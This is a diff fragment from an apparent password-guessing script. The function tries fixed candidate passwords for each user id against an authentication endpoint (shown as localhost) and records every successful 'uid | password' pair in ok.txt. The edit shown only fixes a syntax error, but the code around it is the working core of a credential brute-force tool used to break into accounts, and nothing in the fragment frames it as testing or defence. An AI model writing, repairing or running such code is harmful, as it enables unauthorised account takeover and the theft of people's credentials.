@@ -403,7 +403,7 @@ def b_menu_select():
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass6+"\n")
 		                            ok.close()
-		                            oks.append(uid + pass6))
+		                            oks.append(uid + pass6)
 		                        else:
 		                            pass7="445566"
 		                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
